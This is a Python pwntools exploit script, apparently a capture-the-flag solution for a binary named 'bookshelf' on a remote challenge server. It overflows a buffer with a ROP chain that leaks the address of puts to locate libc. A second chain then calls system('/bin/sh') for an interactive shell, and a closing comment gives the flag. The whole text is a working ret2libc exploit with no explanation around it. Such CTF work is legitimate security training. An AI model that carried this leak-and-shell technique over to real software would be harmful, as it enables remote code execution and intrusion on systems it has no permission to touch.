```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./bookshelf_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

p = remote('chal.pctf.competitivecyber.club' , 8989)

# context.binary = exe
# p = process([exe.path])
# gdb.attach(p, gdbscript = '''
# b*0x0000000000401478
# b*0x000000000040148e
# c
# ''')
           
# input()

pop_rdi = 0x000000000040101c
ret = 0x000000000040101a
p.sendlineafter(b'>>' , b'1')
p.sendlineafter(b'>>' , b'y' * 40)


p.sendlineafter(b'>>' , b'3')
payload = b'a'*0x38
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
p.sendlineafter(b'>>' , payload)

p.recvuntil(b"Book saved!\n")
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
print(hex(libc_leak))
print(hex(libc.address))

p.sendlineafter(b'>>' , b'1')
p.sendlineafter(b'>>' , b'y' * 40)

p.sendlineafter(b'>>' , b'3')
payload = b'a'*0x38
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])

p.sendlineafter(b'>>' , payload)

p.interactive()
# PCTF{r0p_l34k_1st!!1!_16719345}


```
